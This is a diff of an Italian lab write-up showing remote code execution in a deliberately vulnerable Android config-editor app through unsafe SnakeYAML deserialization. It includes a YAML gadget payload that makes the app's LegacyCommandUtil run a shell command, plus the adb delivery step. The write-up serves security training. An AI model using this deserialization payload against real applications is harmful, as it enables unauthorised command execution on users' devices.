@@ -10,6 +10,8 @@ Achieve Remote Code Execution via a Config Editor app in Android by exploiting v
 4. [Exploiting](#exploiting)
 5. [Shell is the way](#shell-is-the-way)
 6. [And now?](#and-now)
+7. [Utils](#utils)
+8. [References](#references)
 
 ## Look Around
 
@@ -54,17 +56,19 @@ In questo caso, l'applicazione gestirà i link con scheme `file://`, `http://` e
         </activity>
 ```
 
-### MainActivity
+### MainActivity & yaml.load
 
-+ Look into MainActivity and what happen
+`loadYaml` funzione interessante al suo interno: `Object deserializedData = yaml.load(inputStream);`
+Vediamo, attraverso gli `import` nell'app e nelle subdirectory presenti `/org/yaml/snakeyaml` che il metodo `load`
+proviene da SnakeYAML.
+Da documentazione: `SnakeYAML is a YAML 1.1 processor for the Java Virtual Machine version 8+.`
+Cercando su internet per SnakeYAML e Deserialization notiamo che [CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-1471)
 
-### SnakeYAML
+```txt
+SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.
+```
 
-+ SnakeYaml CVE
-
-### SemGrep
-
-+ SemGrep Rules
+Non sono stato in grado di trovare la versione esatta di SnakeYAML ma cercando per SnakeYaml's `SafeConsturctor` in `/org/yaml/snakeyaml` non troviamo occorrenze quindi ho presupposto fosse una buona strada da perseguire.
 
 ## Dynamic Analysis
 
@@ -85,9 +89,27 @@ $linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/ex
 
 ## Exploiting
 
+Adattamento SnakeYAML per la nostra App Android.
+
+Nel path `/com/mobilehackinglab/configeditor/LegacyCommandUtil.java`
+che ci può permettere tramite deserializzazione di richiamare LegacyCommandUtil ed eseguire comandi di sistema.
+
+```java
+public final class LegacyCommandUtil {
+    public LegacyCommandUtil(String command) {
+        Intrinsics.checkNotNullParameter(command, "command");
+        Runtime.getRuntime().exec(command);
+    }
+}
+```
+
+Creiamo file `yaml`
+
 ```yaml
 pwn: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/bin/touch /data/data/com.mobilehackinglab.configeditor/pwn.txt" ]
 ```
+
+Testiamo questa RCE
 
 ```sh
 $linux> touch pwn.yaml
@@ -98,7 +120,7 @@ output: pwn.txt # in listing file
 ```
 
 <p align="center">
-<img src="assets/pwn.png" width="350"/>
+<img src="assets/pwn.png" width="500"/>
 </p>
 
 ## Shell is the way
@@ -107,4 +129,15 @@ output: pwn.txt # in listing file
 
 ## And now?
 
+RCE / ACE su utente Android non ci dà molti privilegi e non possiamo muoverci liberamente nel file system. Quali sono i passi successivi?
+
+### Android Kernel Privesc & SandBox Escape
+
 + Android Kernel Privesc, Sandbox Escape, etc
+
+## Utils
+
++ SemGrep Rules
+
+## References
+
